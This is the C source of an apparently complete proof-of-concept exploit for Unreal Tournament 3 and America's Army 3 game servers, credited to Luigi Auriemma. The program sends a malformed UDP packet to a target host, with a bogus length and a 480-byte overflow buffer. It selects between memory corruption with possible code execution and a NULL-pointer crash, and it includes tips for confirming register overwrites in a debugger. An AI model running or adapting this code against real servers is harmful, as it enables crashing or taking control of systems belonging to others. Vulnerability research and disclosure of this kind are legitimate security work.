/*
    Copyright 2008,2009 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl-2.0.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <ctype.h>
#include <time.h>
#include "rwbits.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1.1"
#define PORT        7777
#define BUFFSZ      1024    // the max supported is 576
#define BOFSZ       480
#define CODEEXECHELP \
            "     remember to use \"unrealfp -1 SERVER PORT\" BEFORE this proof-of-concept\n" \
            "     if your testing server has been barely launched or was empty otherwise\n" \
            "     could be not possible to verify the overwritten registers with the\n" \
            "     debugger.\n" \
            "     if nothing happens within half minute, relaunch this proof-of-concept\n" \
            "     while if there are problems to overwrite the registers wait 10 seconds\n" \
            "     between the usage of unrealfp and this proof-of-concept\n" \

#define GS2_QUERY   "\xfe\xfd\x00" "\x00\x00\x00\x00"                    "\xff\x00\x00" "\x00"
#define GS3_QUERY   "\xfe\xfd\x09" "\x00\x00\x00\x00"
#define GS3_QUERYX  "\xfe\xfd\x00" "\x00\x00\x00\x00" "\x00\x00\x00\x00" "\xff\x00\x00" "\x00"



int unreal_info(struct sockaddr_in *peer);
int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...);
int write_unrser(int num, u8 *buff, int bits, int max);
int write_bitmem(u8 *in, int inlen, u8 *out, int bits);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     b,
            i,
            sd,
            len,
            attack;
    u16     port    = PORT;
    u8      buff[BUFFSZ],
            *host;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Unreal Tournament 3 <= 1.2/1.3beta4 memory corruption and NULL pointer "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%hu)]\n"
            "\n"
            "Attacks:\n"
            " 1 = memory corruption (possible code execution)\n"
            CODEEXECHELP
            " 2 = NULL pointer\n"
            " 3 = memory corruption in America's Army 3 <= 3.0.4 (same bug as 1)\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);
    if(argc > 3) port = atoi(argv[3]);
    host = argv[2];

    peer.sin_addr.s_addr  = resolv(host);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    if(port != 7777) unreal_info(&peer);

    b = 0;
    b = write_unrser(0, buff, b, 0x4000);
    b = write_bits(0, 1, buff, b);
    b = write_bits(1, 1, buff, b);
    b = write_bits(1, 1, buff, b);
    b = write_bits(0, 1, buff, b);
    b = write_bits(1, 1, buff, b);
    if(attack == 3) {
        b = write_unrser(1, buff, b, 0x5dc);    // <== BUG!
        attack = 1;
    } else {
        b = write_unrser(1, buff, b, 0x3ff);    // <== BUG!
    }
    b = write_unrser(1, buff, b, 0x400);
    b = write_unrser(1, buff, b, 0x08);
    if(attack == 2) {
        b = write_unrser((4 + 4 + 2) << 3, buff, b, 0x1000);
          b = write_bits(0, 32, buff, b);
          b = write_bits(0, 32, buff, b);
          b = write_bits(0xffff, 16, buff, b);
    } else {
        b = write_unrser((4 + 4 + 2 + BOFSZ) << 3, buff, b, 0x1000);
          b = write_bits(0, 32, buff, b);
          b = write_bits(0, 32, buff, b);
          b = write_bits(BOFSZ, 16, buff, b);
          for(i = 0; i < BOFSZ; i++) b = write_bits('A', 8, buff, b);
    }

    write_bits(0, 8, buff, b);  // zero pad
    len = b >> 3;
    if(!(buff[len] & 0x80)) buff[len] |= (1 << (b & 7));
    len++;

    printf("\n- send malformed packet:\n");
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    if(send_recv(sd, buff, len, buff, BUFFSZ, &peer, 0) == -1) std_err();
    close(sd);
    printf("\n- now wait some seconds and then check the server manually\n");
    if(attack == 1) {
        printf("\nNote\n%s", CODEEXECHELP);
    }
    return(0);
}



int unreal_info(struct sockaddr_in *peer) {
    u32     chall;
    int     sd,
            len,
            retver      = 0;
    u8      buff[4096],
            gs3[sizeof(GS3_QUERYX) - 1],
            *gamever    = NULL,
            *hostport   = NULL;

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    printf("\n- send info queries\n");
          send_recv(sd, GS2_QUERY, sizeof(GS2_QUERY) - 1, NULL, 0, peer, 0);
          send_recv(sd, GS3_QUERY, sizeof(GS3_QUERY) - 1, NULL, 0, peer, 0);
    len = send_recv(sd, NULL, 0, buff, sizeof(buff), peer, 0);
    if(len < 0) goto quit;
    if(buff[0] == 9) {
        memcpy(gs3, GS3_QUERYX, sizeof(GS3_QUERYX) - 1);
        chall = atoi(buff + 5);
        gs3[7]  = chall >> 24;
        gs3[8]  = chall >> 16;
        gs3[9]  = chall >>  8;
        gs3[10] = chall;
        len = send_recv(sd, gs3, sizeof(GS3_QUERYX) - 1, buff, sizeof(buff), peer, 0);
        if(len < 0) goto quit;
    }

    printf("\n- handle reply:\n");
    gs_handle_info(buff, len,
        0, '\0', 5, 0,
        "gamever",  &gamever,
        "hostport", &hostport,
        NULL,       NULL);

    if(gamever) {
        retver = atoi(gamever);
    }
    if(hostport && hostport[0]) {
        peer->sin_port = htons(atoi(hostport));
        printf("\n- set hostport %hu\n", ntohs(peer->sin_port));
    }

quit:
    close(sd);
    return(retver);
}



int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...) {
    va_list ap;
    int     i,
            args,
            found;
    u8      **parz,
            ***valz,
            *p,
            *limit,
            *par,
            *val;

    va_start(ap, rear);
    for(i = 0; ; i++) {
        if(!va_arg(ap, u8 *))  break;
        if(!va_arg(ap, u8 **)) break;
    }
    va_end(ap);

    args = i;
    parz = malloc(args * sizeof(u8 *));
    valz = malloc(args * sizeof(u8 **));

    va_start(ap, rear);
    for(i = 0; i < args; i++) {
        parz[i]  = va_arg(ap, u8 *);
        valz[i]  = va_arg(ap, u8 **);
        *valz[i] = NULL;
    }
    va_end(ap);

    found  = 0;
    limit  = data + datalen - rear;
    *limit = 0;
    data   += front;
    par    = NULL;
    val    = NULL;

    for(p = data; (data < limit) && p; data = p + 1, nt++) {
        p = strchr(data, chr);
        if(p) *p = 0;

        if(nt & 1) {
            if(!par) continue;
            val = data;
            printf("  %30s %s\n", par, val);

            for(i = 0; i < args; i++) {
                if(!stricmp(par, parz[i])) *valz[i] = val;
            }
        } else {
            par = data;
        }
    }

    free(parz);
    free(valz);
    return(found);
}



int write_unrser(int num, u8 *buff, int bits, int max) {    // forcompability with core.dll
    int     b;

    for(b = 1; b && (b < max); b <<= 1) {
        bits = write_bits((num & b) ? 1 : 0, 1, buff, bits);
    }
    return(bits);
}



int write_bitmem(u8 *in, int inlen, u8 *out, int bits) {
    for(; inlen--; in++) {
        bits = write_bits(*in, 8, out, bits);
    }
    return(bits);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry = 2,
            len;

    if(in) {
        while(retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!out) return(0);
            if(!timeout(sd, 2)) break;
        }
    } else {
        if(timeout(sd, 3) < 0) retry = -1;
    }

    if(retry < 0) {
        if(!err) return(-2);
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }

    fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


